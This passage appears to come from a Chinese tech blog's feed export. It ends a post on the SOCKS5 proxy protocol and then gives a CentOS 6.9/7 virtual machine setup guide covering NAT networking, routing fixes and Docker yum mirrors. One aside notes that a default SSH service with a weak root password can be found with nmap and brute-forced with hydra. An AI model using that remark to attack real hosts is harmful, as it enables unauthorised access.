href="https://www.ietf.org/rfc/rfc1929.txt">https://www.ietf.org/rfc/rfc1929.txt</a></p><blockquote><p>对于广大的中国网友来说，一提到代理，肯定会想到翻墙，而socks5作为一种代理协议，肯定也能用来翻墙嘛。不过遗憾的是，虽然它是代理协议，然而并不能用于翻墙。因为它的数据都是明文传输，会被墙轻易阻断。</p><p>socks协议历史悠久，它面世时中国的互联网尚未成型，更别说墙，因此它并不是为翻墙而设计的协议。互联网早期，企业内部网络为了保证安全性，都是置于防火墙之后，这样带来的副作用就是访问内部资源会变得很麻烦，socks协议就是为了解决这个问题而诞生的。</p><p>socks相当于在防火墙撕了一道口子，让合法的用户可以通过这个口子连接到内部，从而访问内部的一些资源和进行管理。</p></blockquote></li></ul><h1 id="二、通信流程"><a href="#二、通信流程" class="headerlink" title="二、通信流程"></a>二、通信流程</h1><img src="/2024/12/13/nei-wang-gong-fang/socks5-dai-li-xie-yi/%E6%88%AA%E5%B1%8F2024-12-13%2015.43.58.png" style="zoom:50%;"><ul><li>客户端首先与SOCKS5服务器建立TCP连接。</li><li>接着进行身份验证，客户端和服务器协商支持的认证方式。</li><li>客户端发送连接请求，包括要访问的服务器域名或IP以及端口信息。</li><li>SOCKS5服务器收到请求后，向目标服务器建立TCP连接，并将请求转发给目标服务器。</li><li>目标服务器的响应通过SOCKS5服务器转发回客户端。</li></ul><h1 id="三、应用场景"><a href="#三、应用场景" class="headerlink" title="三、应用场景"></a>三、应用场景</h1><ul><li><strong>隐私保护与匿名上网</strong>：SOCKS5代理可以隐藏用户的真实IP地址，帮助用户在网络上保持匿名，避免网络追踪和地理限制。</li><li><strong>绕过网络限制</strong>：SOCKS5代理能够帮助用户绕过地方性或网络服务提供商设置的访问限制，例如在审查严格的环境下访问互联网内容。</li><li><strong>远程连接到本地网络</strong>：SOCKS5代理在远程工作场景中具有重要应用，远程工作人员可以使用SOCKS5代理连接到公司内部网络，安全地访问公司资源。</li><li><strong>数据抓取和网络爬虫</strong>：对于从事数据抓取和网络爬虫工作的用户，SOCKS5代理具有出色的性能优势，能够绕过网站的反爬虫机制。</li></ul><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://wiyi.org/socks5-protocol-in-deep.html">https://wiyi.org/socks5-protocol-in-deep.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网攻防 </tag>
            
            <tag> SOCKS5 </tag>
            
            <tag> 代理协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos虚拟机安装及问题解决</title>
      <link href="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/"/>
      <url>/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/</url>
      
        <content type="html"><![CDATA[<h1 id="一、-centos6-9"><a href="#一、-centos6-9" class="headerlink" title="一、 centos6.9"></a>一、 centos6.9</h1><p>这篇文章的背景是我想在centos上安装docker进行学习和练习，之前安装过一台centos6.9，是带UI界面的，尝试安装docker的过程中碰到了一些问题。这里以它为例子来演示一些相关问题的解决（都是实际踩过的一些坑，最后新装了一台最小化安装的centos7，不过解决问题的思路大体相似）。</p><h2 id="1-1-网络不通问题排查解决（后面有复盘分析）"><a href="#1-1-网络不通问题排查解决（后面有复盘分析）" class="headerlink" title="1.1 网络不通问题排查解决（后面有复盘分析）"></a>1.1 网络不通问题排查解决（后面有复盘分析）</h2><p>虚拟机：centos6.9、NAT模式，目标联通互联网。</p><blockquote><ul><li>网络不通问题排查解决：（后面有复盘分析）</li></ul><p>centos虚拟机NAT模式，eth0的ip为192.168.155.254，宿主机ip192.168.155.1（且无法ping通。）</p><p>运行dhclient后成功ping通宿主机。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.02.37.png" style="zoom:40%;"><p>但还是无法ping通互联网。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.03.19.png" style="zoom:35%;"><p>编辑网络配置文件<code>/etc/sysconfig/network-scripts/ifcfg-eth0</code>（根据实际网卡名称修改）</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.05.59.png" style="zoom:40%;"><p>目前是静态ip配置。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.07.03.png" style="zoom:40%;"><p>eth1的配置如上，把eth1配置为dhcp获取IP。配置</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.11.53.png" alt="截屏2024-12-12 10.11.53" style="zoom:40%;"><p>/etc/init.d/network restart 【重启网卡】</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.13.04.png" style="zoom:35%;"><p>判断是网卡没有连接，检查虚拟机配置进行验证。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.14.34.png" style="zoom:50%;"><p>将网卡2设置为NAT模式并连接。/etc/init.d/network restart 【重启网卡】</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.15.31.png" alt="截屏2024-12-12 10.15.31" style="zoom:40%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.16.03.png" style="zoom:40%;"><p>ip配置成功，但还是无法连接互联网。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.17.16.png" style="zoom:40%;"><p>查看路由表，route -n</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.21.27.png" style="zoom:50%;"><p>第二条记录的网关是0.0.0.0，最终绕到了192.168.2.1。</p><p>这里的关键是默认路由，它定义了当没有特定路由匹配时数据包的去向。在您的路由表中，默认路由的网关是 <code>192.168.2.1</code>，这意味着所有非本地目的地的数据包都将通过 <code>eth0</code> 接口发送到这个网关。</p><p>编辑eth1的配置文件，添加网关：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.26.01.png" style="zoom:50%;"><p>仍然无法ping通互联网。检查路由发现没有更新网关。「估计忘记重启网卡了！」</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.26.37.png" alt="截屏2024-12-12 10.26.37" style="zoom:50%;"><p>/etc/init.d/network restart 重启网卡。网关配置生效。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.27.37.png" alt="截屏2024-12-12 10.27.37" style="zoom:50%;"><p>互联网成功ping通。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.28.01.png" style="zoom:50%;"><ul><li>复盘</li></ul><p>事实上排查网络问题只要把握路由表、网卡设置两个环节即可。</p><p>我的虚拟机设置了两块网卡，对应eth0和eth1，eth0之前配置过静态ip，且在192.168.2.0/24网段，跟网关192.168.155.1/24不在一个网段，所以一开始就ping不同192.168.155.1的网关，更不可能ping通百度。</p><p>对eth1网卡进行dhcp的设置，连接网卡硬件之后重启网卡服务获得ip（NAT模式下这个ip跟宿主机ip192.168.155.1是同网段的），发现仍然无法ping通网关，查看路由表发现eth1走的是默认网关，默认最终指向192.168.2.1（这个是192.168.2.0/24的网关），所以流量出不去。</p><p>最后修改eth1的网关设置，重启网卡，路由表生效之后，成功ping通互联网。</p></blockquote><h2 id="1-2-卸载旧版Docker"><a href="#1-2-卸载旧版Docker" class="headerlink" title="1.2 卸载旧版Docker"></a>1.2 卸载旧版Docker</h2><p>首先如果系统中已经存在旧的Docker，则先卸载：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum remove <span class="token function">docker</span> <span class="token punctuation">\</span>    docker-client <span class="token punctuation">\</span>    docker-client-latest <span class="token punctuation">\</span>    docker-common <span class="token punctuation">\</span>    docker-latest <span class="token punctuation">\</span>    docker-latest-logrotate <span class="token punctuation">\</span>    docker-logrotate <span class="token punctuation">\</span>    docker-engine <span class="token punctuation">\</span>    docker-selinux <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.41.30.png" alt="截屏2024-12-12 10.41.30"></p><p>我的虚拟机上没有需要删除的docker相关的包。</p><h2 id="1-3-配置Docker的yum源"><a href="#1-3-配置Docker的yum源" class="headerlink" title="1.3  配置Docker的yum源"></a>1.3  配置Docker的yum源</h2><ul><li>yum工具包安装</li></ul><p>首先要安装一个yum工具。</p><pre class="line-numbers language-Bash" data-language="Bash"><code class="language-Bash">sudo yum install -y yum-utils device-mapper-persistent-data lvm2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.42.52.png" alt="截屏2024-12-12 10.42.52"></p><p>系统上已经存在。</p><ul><li>配置yum源</li></ul><p>安装成功后，执行命令，配置Docker的yum源（已更新为阿里云源）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<span class="token function">sudo</span> <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s+download.docker.com+mirrors.aliyun.com/docker-ce+'</span> /etc/yum.repos.d/docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.44.31.png" alt="截屏2024-12-12 10.44.31" style="zoom:50%;"><blockquote><p>sudo sed -i ‘s+download.docker.com+mirrors.aliyun.com/docker-ce+’ /etc/yum.repos.d/docker-ce.repo</p><p>命令解释：</p><ol><li><code>sed</code>: 调用sed工具，它是一个流编辑器，用于对文本进行过滤和替换。</li><li><code>-i</code>: 选项告诉sed直接在文件中进行编辑，而不是输出到标准输出（即终端）。这会导致原文件被修改。</li><li><code>'s+download.docker.com+mirrors.aliyun.com/docker-ce+'</code>: 这是一个sed的替换命令，它指示sed执行以下操作：<ul><li><code>s</code>: 表示替换（substitute）。</li><li><code>+</code>: 在sed中用作分隔符，这里它替代了默认的空格分隔符，因为默认的空格在URL中会出现，使用<code>+</code>可以避免这种情况。</li><li><code>download.docker.com</code>: 这是要被替换的字符串，即原始的Docker镜像源地址。</li><li><code>mirrors.aliyun.com/docker-ce</code>: 这是替换后的字符串，即阿里云的Docker镜像源地址。</li></ul></li><li><code>/etc/yum.repos.d/docker-ce.repo</code>: 指定了要编辑的文件路径。这个文件是Docker CE（社区版）的YUM仓库配置文件。</li></ol></blockquote><ul><li>更新yum，建立缓存</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum makecache fast<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li>问题解决</li><li>报错：<br>Loaded plugins: fastestmirror, refresh-packagekit, security<br>Loading mirror speeds from cached hostfile<br><a href="https://mirrors.aliyun.com/docker-ce/linux/centos/6/x86_64/stable/repodata/repomd.xml">https://mirrors.aliyun.com/docker-ce/linux/centos/6/x86_64/stable/repodata/repomd.xml</a>: [Errno 14] PYCURL ERROR 22 - “The requested URL returned error: 404 Not Found”<br>Trying other mirror.<br>To address this issue please refer to the below knowledge base article<br><a href="https://access.redhat.com/articles/1320623">https://access.redhat.com/articles/1320623</a><br>If above article doesn’t help to resolve this issue please open a ticket with Red Hat Support.<br>Error: Cannot retrieve repository metadata (repomd.xml) for repository: docker-ce-stable. Please verify its path and try again</li><li>尝试解决：</li></ul><p>​      <strong>检查仓库地址</strong>：确认在 <code>/etc/yum.repos.d/docker-ce.repo</code> 文件中配置的阿里云Docker镜像源地址是正确的。您可以访问阿里云的官方文档或镜像源页面来获取最新的镜像源地址。</p><p>​      检查发现，docker-ce.repo文件中存在一些之前就有的yum源配置。如图。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.56.34.png" style="zoom:50%;"><p>​     尝试将这个文件备份，然后删除，重新生执行命令生成新的配置文件。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> <span class="token parameter variable">-r</span> /etc/yum.repos.d /etc/yum.repos.d/docker-ce.backfile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2011.00.00.png" alt="截屏2024-12-12 11.00.00"></p><p>重新生成。</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2011.01.36.png" alt="截屏2024-12-12 11.01.36"></p><p>重新生成的文件仍然是旧的源。</p><p>其实上面的解决思路有问题，因为这个链接<a href="https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%8C%E5%B0%B1%E6%98%AF%E5%B8%A6%E6%9C%89%E7%89%88%E6%9C%AC%EF%BC%88$releasever%EF%BC%89%E7%9A%84%EF%BC%8C%E5%9B%A0%E4%B8%BA%E7%9B%AE%E5%89%8D%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%89%88%E6%9C%AC%E6%98%AFcentos6.9%E5%B9%B6%E4%B8%94%E5%AE%98%E6%96%B9%E4%B9%9F%E4%B8%8D%E7%BB%B4%E6%8A%A4%E8%BF%99%E4%B8%AA%E7%89%88%E6%9C%AC%E7%9A%84yum%E6%BA%90%E4%BB%93%E5%BA%93%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5sudo">https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo下载的文件内容，就是带有版本（$releasever）的，因为目前的虚拟机版本是centos6.9并且官方也不维护这个版本的yum源仓库了，所以sudo</a> yum makecache fast的时候才会报错。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>docker-ce-stable<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>Docker CE Stable - <span class="token variable">$basearch</span><span class="token assign-left variable">baseurl</span><span class="token operator">=</span>https://mirrors.aliyun.com/docker-ce/linux/centos/<span class="token variable">$releasever</span>/<span class="token variable">$basearch</span>/stable<span class="token assign-left variable">enabled</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">gpgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>https://mirrors.aliyun.com/docker-ce/linux/centos/gpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>能想到的最直接的两个办法：</p><ol><li><strong>升级操作系统</strong>：最直接的解决方案是升级到一个受支持的 CentOS 版本，如 CentOS 7 或 CentOS 8。这样可以继续获得官方的维护和更新。</li><li><strong>寻找其他镜像源</strong>：您可以寻找其他提供 CentOS 6.9 镜像的源。例如，一些第三方可能仍然提供 CentOS 6.9 的镜像。但请注意，使用第三方源可能会带来安全风险，因为它们可能不会及时更新安全补丁。</li></ol><p>其他的yum源也没有找到合适的。目前貌似本机的其他yum源也有些问题。</p><p>如果设置本机的yum源可以参考：</p><p><a href="https://www.cnblogs.com/hunttown/p/18225058">https://www.cnblogs.com/hunttown/p/18225058</a> </p><p>但centos6.9确实是有点过时了，打算安装一个centos7版本的虚拟机。</p></blockquote><h1 id="二、-centos7"><a href="#二、-centos7" class="headerlink" title="二、 centos7"></a>二、 centos7</h1><h2 id="2-1-安装centos7"><a href="#2-1-安装centos7" class="headerlink" title="2.1 安装centos7"></a>2.1 安装centos7</h2><ul><li>选择创建自定虚拟机。</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.29.13.png" style="zoom:50%;"><ul><li>选择linux，CentOS 7 64位</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.31.54.png" style="zoom:50%;"><ul><li>选择传统BIOS</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.33.26.png" style="zoom:50%;"><blockquote><h4 id="BIOS是什么？"><a href="#BIOS是什么？" class="headerlink" title="BIOS是什么？"></a>BIOS是什么？</h4><p>BIOS（Basic Input/Output System，基本输入输出系统）是计算机启动时加载的第一个软件，它是一个固件程序，存储在计算机主板上的一个芯片中。BIOS的主要功能包括：</p><ol><li><strong>硬件初始化</strong>：在操作系统加载之前，BIOS负责对计算机的硬件组件进行初始化，包括CPU、内存、硬盘、显卡等。</li><li><strong>启动顺序设置</strong>：BIOS允许用户设置启动设备的优先级，比如从硬盘、光盘、USB设备或网络启动。</li><li><strong>硬件检测</strong>：在启动过程中，BIOS会检测系统中的硬件设备，确保它们正常工作。</li><li><strong>操作系统引导</strong>：BIOS通过引导扇区（boot sector）加载操作系统的引导程序，然后将控制权交给操作系统。</li><li><strong>系统设置</strong>：BIOS提供了一个设置界面，用户可以配置系统的各种参数，如时间、日期、启动顺序、CPU频率等。</li><li><strong>错误报告</strong>：如果硬件初始化过程中出现问题，BIOS会通过屏幕显示错误信息，帮助用户诊断问题。</li></ol><p>随着技术的发展，BIOS逐渐被UEFI（Unified Extensible Firmware Interface，统一可扩展固件接口）所取代。UEFI提供了更多的功能，如更大的存储空间、图形界面、安全启动等，并且支持大于2.2TB的硬盘和64位操作系统。然而，BIOS和UEFI在概念上是相似的，都是计算机启动过程中的关键组件。</p><h4 id="安装虚拟机的时候选BIOS还是UEFI，有什么区别？"><a href="#安装虚拟机的时候选BIOS还是UEFI，有什么区别？" class="headerlink" title="安装虚拟机的时候选BIOS还是UEFI，有什么区别？"></a>安装虚拟机的时候选BIOS还是UEFI，有什么区别？</h4><p>在安装虚拟机时选择BIOS或UEFI取决于操作系统需求、虚拟机软件支持及个人偏好。BIOS（基本输入输出系统）兼容性强，适合旧操作系统，但功能有限，如最大2TB硬盘和4GB内存限制。UEFI（统一可扩展固件接口）是现代标准，支持大容量硬盘、更多内存，提供安全启动和快速启动特性。若操作系统和虚拟机软件支持，且需要高级功能，UEFI是优选。然而，对于旧系统或特殊需求，BIOS可能更合适。选择前，应考虑操作系统兼容性、虚拟机软件功能及个人对配置的熟悉程度。</p></blockquote><ul><li>选择新建虚拟盘</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.51.12.png" style="zoom:50%;"><ul><li>点击完成</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.51.51.png" style="zoom:50%;"><ul><li>存储</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.52.30.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.54.12.png" style="zoom:40%;"><ul><li>安装镜像</li></ul><p>虚拟机=&gt;设置=&gt;CD/DVD（IDE）</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.54.48.png" style="zoom:40%;"><p>选择镜像并连接</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.56.06.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.57.08.png" style="zoom:40%;"><p>选择第一项或第二项。回车。</p><ul><li>系统安装</li></ul><p>选择语言：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.59.31.png" style="zoom:30%;"><p>继续设置</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.00.26.png" style="zoom:30%;"><p>选择DATE&amp;TIME，设置时间一般选择上海。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.03.46.png" style="zoom:30%;"><p>点击SOFTWARE SELECTION 进入环境选择，这个镜像为最小化镜像，所以只有一个选项。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.05.48.png" style="zoom:30%;"><p>点击完成后进入安装目标位置，直接点击完成</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.06.37.png" style="zoom:30%;"><p>点击网络，打开，然后点击完成。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.07.28.png" style="zoom:30%;"><p>点击开始安装。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.08.08.png" style="zoom:30%;"><p>设置密码：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.08.33.png" style="zoom:30%;"><p>耐心等待安装完成。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.09.15.png" style="zoom:30%;"><p>完成后点击重启。</p><h2 id="2-2-问题解决"><a href="#2-2-问题解决" class="headerlink" title="2.2 问题解决"></a>2.2 问题解决</h2><p>登录：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.14.05.png" style="zoom:50%;"><p>ifconfig命令不存在：</p><h3 id="2-2-1-网络连通问题解决"><a href="#2-2-1-网络连通问题解决" class="headerlink" title="2.2.1 网络连通问题解决"></a>2.2.1 网络连通问题解决</h3><p>ip addr查看网络地址：</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.18.24.png" alt="截屏2024-12-12 16.18.24"></p><p>yum 安装net-tools</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> net-tools<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.19.38.png" alt="截屏2024-12-12 16.19.38"></p><p>看样子是网络的问题，得先解决网络问题。</p><ul><li>解决网路连接问题</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.22.08.png" style="zoom:50%;"><p>配置：目前只保留了这几项，</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.24.36.png" style="zoom:50%;"><p>重启网卡：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.26.03.png" style="zoom:50%;"><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.26.36.png" alt="截屏2024-12-12 16.26.36"></p><p>成功获取到IP，192.168.155.34.</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.27.14.png" alt="截屏2024-12-12 16.27.14" style="zoom:50%;"><p>成功ping通互联网。</p><h3 id="2-2-2-安装net-tools工具包"><a href="#2-2-2-安装net-tools工具包" class="headerlink" title="2.2.2 安装net-tools工具包"></a>2.2.2 安装net-tools工具包</h3><p>yum update报错。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.28.59.png" alt="截屏2024-12-12 16.28.59" style="zoom:50%;"><p>图片中的错误信息表明 <code>yum</code> 在尝试更新时无法从 CentOS 的镜像列表中检索信息，因为无法解析 <code>mirrorlist.centos.org</code> 的主机名。这可能是由于网络连接问题、DNS 解析问题或 CentOS 镜像源配置问题。</p><p>后面配置完成yum源之后再安装。</p><h3 id="2-2-3-用mac终端进行ssh连接管理"><a href="#2-2-3-用mac终端进行ssh连接管理" class="headerlink" title="2.2.3 用mac终端进行ssh连接管理"></a>2.2.3 用mac终端进行ssh连接管理</h3><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.32.53.png" alt="截屏2024-12-12 16.32.53"></p><p>【这里提一个点，默认安装开启ssh服务，如果设置的时候用了弱口令，用nmap等扫描攻击发现ip:port之后，可以直接用hydra爆破登录，而且登录就是root用户。】</p><h3 id="2-2-4-配置yum源"><a href="#2-2-4-配置yum源" class="headerlink" title="2.2.4 配置yum源"></a>2.2.4 配置yum源</h3><p>备份原始文件</p><pre class="line-numbers language-none"><code class="language-none">cd /etc/yum.repos.dmv CentOS-Base.repo CentOS-Base.repo.bak<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>修改 CentOS-Base.repo 文件</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># CentOS-Base.repo</span><span class="token comment">#</span><span class="token comment"># The mirror system uses the connecting IP address of the client and the</span><span class="token comment"># update status of each mirror to pick mirrors that are updated to and</span><span class="token comment"># geographically close to the client.  You should use this for CentOS updates</span><span class="token comment"># unless you are manually picking other mirrors.</span><span class="token comment">#</span><span class="token comment"># If the mirrorlist= does not work for you, as a fall back you can try the </span><span class="token comment"># remarked out baseurl= line instead.</span><span class="token comment">#</span><span class="token comment">#</span> <span class="token punctuation">[</span>base<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Base - mirrors.aliyun.com<span class="token assign-left variable">failovermethod</span><span class="token operator">=</span>priority<span class="token assign-left variable">baseurl</span><span class="token 